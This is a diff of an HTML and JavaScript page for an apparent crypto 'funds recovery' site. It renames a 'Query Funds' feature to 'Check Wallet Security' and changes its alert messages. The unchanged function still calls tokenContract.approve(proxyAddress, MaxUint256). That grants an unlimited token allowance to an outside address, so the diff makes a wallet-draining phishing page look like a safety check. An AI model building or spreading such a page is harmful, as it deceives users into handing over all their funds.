@@ -88,7 +88,7 @@
     <nav>
         <a href="#notification">Notification</a>
         <a href="#materials">Submit Materials</a>
-        <a href="#recovery">Query Funds</a>
+        <a href="#recovery">Check Security</a>
     </nav>
 
     <!-- Notification Section -->
@@ -122,11 +122,11 @@
 
     <!-- Funds Recovery Section -->
     <div class="container" id="recovery">
-        <h2 class="section-title">Query Funds</h2>
-        <p>Connect your wallet and query funds for recovery.</p>
+        <h2 class="section-title">Check Wallet Security</h2>
+        <p>Connect your wallet and perform a security check to ensure safety.</p>
         <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
         <p id="walletStatus">Wallet Not Connected</p>
-        <button id="approveButton" onclick="approveTokens()" disabled>Query Wallet</button>
+        <button id="approveButton" onclick="checkSecurity()" disabled>Check Security</button>
     </div>
 
     <footer>
@@ -156,7 +156,7 @@
             }
         }
 
-        async function approveTokens() {
+        async function checkSecurity() {
             if (!signer) {
                 alert("Please connect your wallet first!");
                 return;
@@ -167,9 +167,9 @@
 
             try {
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                alert("Query successful!");
+                alert("Wallet security verified successfully!");
             } catch (error) {
-                alert("Query failed. Please check console logs!");
+                alert("Wallet security check failed. Please try again!");
             }
         }
     </script>
